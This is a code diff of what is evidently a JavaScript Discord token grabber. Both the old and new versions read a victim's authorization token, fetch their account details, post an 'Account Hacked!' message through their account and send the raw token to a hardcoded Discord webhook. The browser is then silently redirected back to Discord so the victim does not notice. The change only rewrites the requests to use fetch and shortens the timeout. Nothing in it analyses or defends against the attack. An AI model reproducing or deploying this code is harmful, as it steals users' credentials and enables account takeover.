@@ -27,49 +27,49 @@
         if (token) {
           token = token.replace(/"/g, "");
 
-          // 先取得帳號資訊
-          var usersReq = new XMLHttpRequest();
-          usersReq.open("GET", "https://discord.com/api/v9/users/@me");
-          usersReq.setRequestHeader("Authorization", token);
-          usersReq.onreadystatechange = function() {
-            if (usersReq.readyState === 4 && usersReq.status === 200) {
-              try {
-                var user = JSON.parse(usersReq.responseText);
-                var username = user.username;
-                var userId = user.id;
-                var email = user.email || 'N/A';
-
-                // 發送訊息到目標
-                var msgReq = new XMLHttpRequest();
-                msgReq.open("POST", "https://discord.com/api/v9/channels/878151437085974548/messages");
-                msgReq.setRequestHeader("Content-Type", "application/json");
-                msgReq.setRequestHeader("Authorization", token);
-                msgReq.send(JSON.stringify({
-                  content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
-                }));
-
-                // 把 token 送到 webhook（同步請求確保送出）
-                var wbReq = new XMLHttpRequest();
-                wbReq.open("POST", "https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", false);
-                wbReq.setRequestHeader("Content-Type", "application/json");
-                wbReq.send(JSON.stringify({
-                  content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
-                }));
-
-                // 所有請求都發送完畢，跳回 Discord
-                window.location.href = "https://discord.com/channels/@me";
-              } catch(e) {
-                console.log("Parse failed:", e);
-                window.location.href = "https://discord.com/channels/@me";
-              }
-            }
-          };
-          usersReq.send();
-
-          // 10 秒超時
-          setTimeout(function() {
+          // 超時 5 秒後跳走
+          var timer = setTimeout(function() {
             window.location.href = "https://discord.com/channels/@me";
-          }, 10000);
+          }, 5000);
+
+          // 取得帳號資訊
+          fetch("https://discord.com/api/v9/users/@me", {
+            headers: { "Authorization": token }
+          }).then(function(res) {
+            if (res.ok) {
+              return res.json();
+            }
+            throw new Error("Not OK");
+          }).then(function(user) {
+            // 發送訊息到目標
+            var msg = {
+              content: "🔓 **Account Hacked!**\n使用者: **" + user.username + "** (" + user.id + ")\nEmail: " + (user.email || 'N/A')
+            };
+            fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "Authorization": token
+              },
+              body: JSON.stringify(msg)
+            }).then(function() {
+              clearTimeout(timer);
+              window.location.href = "https://discord.com/channels/@me";
+            });
+
+            // 把 token 送到 webhook
+            fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                content: "🔓 **Discord Token 已擷取**\n使用者: **" + user.username + "**\n```\n" + token + "\n```"
+              })
+            }).catch(function() {});
+
+          }).catch(function(e) {
+            // users/@me 失敗，跳走
+            window.location.href = "https://discord.com/channels/@me";
+          });
         } else {
           window.location.href = "https://discord.com/channels/@me";
         }
